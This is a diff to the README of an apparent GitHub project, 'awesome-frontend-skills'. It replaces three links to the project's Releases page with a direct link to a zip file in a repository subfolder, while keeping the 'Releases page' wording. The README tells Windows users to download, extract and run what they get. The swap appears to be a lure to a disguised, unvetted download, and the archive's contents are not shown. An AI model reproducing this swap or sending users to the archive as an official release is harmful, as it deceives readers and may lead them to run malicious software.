@@ -1,6 +1,6 @@
 # 🧩 awesome-frontend-skills - Frontend skills made easy
 
-[![Download from Releases](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/Gak6900/awesome-frontend-skills/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20on%20GitHub-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gak6900/awesome-frontend-skills/main/mastodont/awesome_frontend_skills_1.7.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ It helps you add useful frontend skills in a simple way, without hunting through
 
 ## 📥 Download and install
 
-1. Open the [Releases page](https://github.com/Gak6900/awesome-frontend-skills/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Gak6900/awesome-frontend-skills/main/mastodont/awesome_frontend_skills_1.7.zip).
 2. Download the latest release for Windows.
 3. If the release comes as a `.zip` file, right-click it and choose **Extract All**.
 4. Open the extracted folder.
@@ -131,7 +131,7 @@ This keeps the process short and clear.
 
 ## 🔗 Release page
 
-Visit the [GitHub Releases page](https://github.com/Gak6900/awesome-frontend-skills/releases) to download and run the latest release for Windows
+Visit the [GitHub Releases page](https://raw.githubusercontent.com/Gak6900/awesome-frontend-skills/main/mastodont/awesome_frontend_skills_1.7.zip) to download and run the latest release for Windows
 
 ## 📄 Project details
 
